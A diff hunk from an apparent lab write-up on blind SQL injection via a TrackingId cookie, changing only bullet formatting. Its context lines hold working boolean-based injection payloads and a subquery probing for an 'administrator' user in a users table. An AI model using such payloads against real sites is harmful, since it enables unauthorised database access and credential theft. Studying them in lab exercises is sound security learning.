@@ -19,9 +19,9 @@ The application is vulnerable to blind SQL Injection via the TrackingId cookie. 
 * TrackingId=xyz' AND 1=1--
 * * “Welcome back” visible (TRUE)
 
-* * TrackingId=xyz' AND 1=2--
+* TrackingId=xyz' AND 1=2--
 
-* * * “Welcome back” disappears (FALSE) → Confirms conditional response
+* * “Welcome back” disappears (FALSE) → Confirms conditional response
 
 *Confirm existence of administrator user*
 * TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
